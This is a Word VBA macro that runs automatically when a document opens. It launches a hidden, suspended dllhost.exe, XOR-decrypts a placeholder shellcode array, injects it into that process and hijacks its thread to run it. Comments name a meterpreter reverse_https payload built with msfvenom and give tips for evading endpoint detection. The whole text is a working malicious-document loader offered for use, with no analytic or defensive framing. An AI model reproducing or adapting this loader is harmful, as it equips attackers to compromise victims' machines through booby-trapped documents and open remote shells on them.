#If VBA7 Then
    Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As LongPtr, lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare PtrSafe Function GetThreadContext Lib "kernel32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
    Private Declare PtrSafe Function SetThreadContext Lib "kernel32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
    Private Declare PtrSafe Function ResumeThread Lib "kernel32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Function VirtualProtectEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
    Private Declare PtrSafe Sub RtlZeroMemory Lib "kernel32" (Destination As Any, ByVal Length As LongPtr)
#Else
    Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
    Private Declare Function GetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function SetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As Long
    Private Declare Function VirtualProtectEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
    Private Declare Sub RtlZeroMemory Lib "kernel32" (Destination As Any, ByVal Length As Long)
#End If

Private Type STARTUPINFOA
    cb              As Long
    lpReserved      As String
    lpDesktop       As String
    lpTitle         As String
    dwX             As Long
    dwY             As Long
    dwXSize         As Long
    dwYSize         As Long
    dwXCountChars   As Long
    dwYCountChars   As Long
    dwFillAttribute As Long
    dwFlags         As Long
    wShowWindow     As Integer
    cbReserved2     As Integer
    lpReserved2     As Long
    hStdInput       As LongPtr
    hStdOutput      As LongPtr
    hStdError       As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess    As LongPtr
    hThread     As LongPtr
    dwProcessId As Long
    dwThreadId  As Long
End Type

' CONTEXT structure (minimal for changing RIP/EIP)
Private Type CONTEXT
    ContextFlags As Long
    ' ... many fields skipped for brevity ...
#If Win64 Then
    Rip          As LongPtr   ' Instruction Pointer (64-bit)
    Rsp          As LongPtr
    Rbp          As LongPtr
    ' ... other registers if needed ...
#Else
    Eip          As Long      ' Instruction Pointer (32-bit)
    Esp          As Long
    Ebp          As Long
    ' ... other registers ...
#End If
    ' ... rest of CONTEXT fields can be ignored for simple RIP/EIP change ...
End Type

Sub Document_Open()
    InjectShellcode
End Sub

Sub AutoOpen()
    InjectShellcode
End Sub

Private Sub InjectShellcode()
    Dim si As STARTUPINFOA
    Dim pi As PROCESS_INFORMATION
    Dim ctx As CONTEXT
    
    RtlZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H1 Or &H100          ' STARTF_USESHOWWINDOW + STARTF_FORCEONFEEDBACK (optional)
    si.wShowWindow = 0                 ' SW_HIDE = 0
    
    Dim targetPath As String
    targetPath = Environ("SystemRoot") & "\System32\dllhost.exe"   ' Less flagged than svchost in many envs
    
    ' CREATE_SUSPENDED = &H4
    If CreateProcessA(vbNullString, targetPath, 0, 0, 0, &H4, 0, vbNullString, si, pi) = 0 Then
        Exit Sub   ' Failed to create process
    End If
    
    ' Your encrypted shellcode array (replace with real one)
    ' Example: msfvenom -p windows/x64/meterpreter/reverse_https ... -f vbapplication --encrypt xor --encrypt-key "MySecretKey123"
    Dim sc() As Variant
    sc = Array(252, 72, 131, 228, 240, ... )   ' ← PASTE YOUR SHELLCODE HERE ←
    
    Dim key As String
    key = "MySecretKey123"   ' Change this!
    
    Dim shellcode() As Byte
    ReDim shellcode(UBound(sc))
    
    Dim i As Long, j As Long
    j = 0
    For i = 0 To UBound(sc)
        shellcode(i) = CByte(sc(i)) Xor Asc(Mid(key, j + 1, 1))
        j = (j + 1) Mod Len(key)
    Next i
    
    Dim scSize As LongPtr
    scSize = UBound(shellcode) + 1
    
    ' Allocate memory in remote process (MEM_COMMIT | MEM_RESERVE = &H3000, PAGE_EXECUTE_READWRITE = &H40)
    Dim remoteAddr As LongPtr
    remoteAddr = VirtualAllocEx(pi.hProcess, 0, scSize + &H1000, &H3000, &H40)
    If remoteAddr = 0 Then GoTo Cleanup
    
    Dim bytesWritten As LongPtr
    If WriteProcessMemory(pi.hProcess, remoteAddr, shellcode(0), scSize, bytesWritten) = 0 Then GoTo Cleanup
    
    ' Optional: change protection if you want RX instead of RWX (some EDRs flag less)
    ' Dim oldProtect As Long
    ' VirtualProtectEx pi.hProcess, remoteAddr, scSize, &H20, oldProtect   ' PAGE_EXECUTE_READ
    
    ' Get current thread context
    ctx.ContextFlags = &H10007   ' CONTEXT_FULL (or &H10001 for just control registers)
    If GetThreadContext(pi.hThread, ctx) = 0 Then GoTo Cleanup
    
    ' Redirect instruction pointer to shellcode
#If Win64 Then
    ctx.Rip = remoteAddr
#Else
    ctx.Eip = remoteAddr
#End If
    
    If SetThreadContext(pi.hThread, ctx) = 0 Then GoTo Cleanup
    
    ' Let it run
    ResumeThread pi.hThread
    
Cleanup:
    ' Optional: CloseHandle(pi.hProcess) + CloseHandle(pi.hThread)
    ' But in macro context we usually don't care
End Sub
